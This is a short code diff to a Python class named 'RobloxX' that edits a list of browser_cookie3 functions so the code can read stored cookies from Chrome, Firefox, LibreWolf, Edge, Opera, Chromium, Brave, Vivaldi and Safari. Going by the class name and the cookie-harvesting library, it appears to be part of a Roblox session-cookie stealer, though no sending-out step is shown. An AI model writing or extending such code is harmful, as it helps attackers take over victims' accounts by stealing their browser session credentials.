@@ -67,12 +67,13 @@ class RobloxX():
         browsers = [
             browser_cookie3.chrome,
             browser_cookie3.firefox,
-            browser_cookie3.edge,
+            browser_cookie3.librewolf,
             browser_cookie3.opera,
-            browser_cookie3.Chromium,
-            browser_cookie3.Brave,
-            browser_cookie3.Vivaldi,
-            browser_cookie3.Safari
+            browser_cookie3.edge,
+            browser_cookie3.chromium,
+            browser_cookie3.brave,
+            browser_cookie3.vivaldi,
+            browser_cookie3.safari
         ]
         
         
